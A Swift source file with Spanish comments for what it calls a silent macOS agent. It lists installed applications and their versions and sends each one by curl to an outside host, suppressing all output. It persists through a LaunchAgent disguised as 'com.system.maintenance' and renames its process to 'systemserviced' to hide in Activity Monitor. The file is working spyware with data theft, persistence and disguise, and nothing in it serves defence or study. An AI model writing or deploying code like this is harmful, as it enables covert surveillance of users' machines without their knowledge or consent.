import Foundation

// Agente silencioso avanzado para macOS que escanea aplicaciones instaladas
// y las envía a una API externa sin dejar rastros

// Clase principal del agente
class SilentSoftwareScanner {
    
    // Función para obtener la lista de aplicaciones instaladas
    func getInstalledApplications() -> [String] {
        var installedApps: [String] = []
        
        // Directorios comunes donde se instalan aplicaciones en macOS
        let appDirectories = [
            "/Applications",
            "\(NSHomeDirectory())/Applications",
            "/System/Applications"
        ]
        
        // Explorar cada directorio y encontrar las aplicaciones
        for directory in appDirectories {
            let fileManager = FileManager.default
            
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: directory)
                
                // Filtrar por archivos .app
                let apps = contents.filter { $0.hasSuffix(".app") }
                
                for app in apps {
                    // Extraer solo el nombre sin la extensión .app
                    let appName = app.replacingOccurrences(of: ".app", with: "")
                    installedApps.append(appName)
                    
                    // Intentar obtener información adicional de la aplicación
                    let bundlePath = "\(directory)/\(app)"
                    if let bundle = Bundle(path: bundlePath),
                       let bundleVersion = bundle.infoDictionary?["CFBundleShortVersionString"] as? String {
                        let detailedInfo = "\(appName) (v\(bundleVersion))"
                        installedApps[installedApps.count - 1] = detailedInfo
                    }
                }
            } catch {
                // Error silencioso - no imprimir nada para mantener el agente silencioso
            }
        }
        
        return installedApps
    }
    
    // Función para enviar la información a la API de forma silenciosa
    func sendDataToAPI(appName: String) {
        // Crear el proceso para ejecutar curl en silencio total
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/curl")
        
        // Preparar los argumentos para curl (más silencioso con -s para suprimir mensajes)
        process.arguments = [
            "-s", // Silent mode
            "-X", "GET",
            "https://softceh.free.beeceptor.com",
            "-H", "some-header: \(appName)"
        ]
        
        // Redireccionar la salida a /dev/null para suprimir cualquier mensaje
        let nullFileHandle = FileHandle(forWritingAtPath: "/dev/null")
        process.standardOutput = nullFileHandle
        process.standardError = nullFileHandle
        
        do {
            try process.run()
            process.waitUntilExit()
        } catch {
            // Error silencioso - no imprimir nada
        }
    }
    
    // Función para programar ejecuciones periódicas
    func schedulePeriodicExecution() {
        // Ejecutar una vez al inicio
        self.scanAndSendData()
        
        // Programar ejecuciones periódicas (cada 24 horas)
        let timer = Timer.scheduledTimer(withTimeInterval: 86400, repeats: true) { [weak self] _ in
            self?.scanAndSendData()
        }
        
        // Mantener el timer activo
        RunLoop.current.add(timer, forMode: .common)
    }
    
    // Función principal para escanear y enviar datos
    func scanAndSendData() {
        let apps = getInstalledApplications()
        
        for app in apps {
            sendDataToAPI(appName: app)
            
            // Pequeña pausa entre peticiones para no sobrecargar la API
            Thread.sleep(forTimeInterval: 0.5)
        }
    }
    
    // Función para registrar el agente para inicio automático
    func setupAutoLaunch() {
        guard let currentExecutablePath = Bundle.main.executablePath else { return }
        
        // Crear un archivo plist para LaunchAgents
        let plistContent = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.system.maintenance</string>
            <key>ProgramArguments</key>
            <array>
                <string>\(currentExecutablePath)</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <true/>
            <key>StandardErrorPath</key>
            <string>/dev/null</string>
            <key>StandardOutPath</key>
            <string>/dev/null</string>
        </dict>
        </plist>
        """
        
        let launchAgentDir = "\(NSHomeDirectory())/Library/LaunchAgents"
        let launchAgentPath = "\(launchAgentDir)/com.system.maintenance.plist"
        
        // Crear el directorio si no existe
        let fileManager = FileManager.default
        if !fileManager.fileExists(atPath: launchAgentDir) {
            try? fileManager.createDirectory(atPath: launchAgentDir, withIntermediateDirectories: true)
        }
        
        // Escribir el archivo plist
        try? plistContent.write(toFile: launchAgentPath, atomically: true, encoding: .utf8)
    }
}

// Asegurar que el proceso sea invisible en Activity Monitor cambiando el nombre del proceso
class ProcessMasker {
    func maskProcess() {
        // Cambiar el nombre del proceso por algo inofensivo
        let argc = CommandLine.argc
        let argv = CommandLine.unsafeArgv
        let newName = "systemserviced" // Nombre que parece un servicio del sistema
        
        newName.withCString { cString in
            for i in 0..<Int(argc) {
                guard let arg = argv?[i] else { continue }
                strcpy(arg, cString)
            }
        }
    }
}

// Función principal
func main() {
    // Cambiar el nombre del proceso
    let masker = ProcessMasker()
    masker.maskProcess()
    
    let scanner = SilentSoftwareScanner()
    
    // Configurar inicio automático
    scanner.setupAutoLaunch()
    
    // Ejecutar el escaneo en segundo plano
    DispatchQueue.global(qos: .background).async {
        scanner.schedulePeriodicExecution()
    }
    
    // Mantener el programa ejecutándose
    RunLoop.main.run()
}

// Iniciar el agente
main() 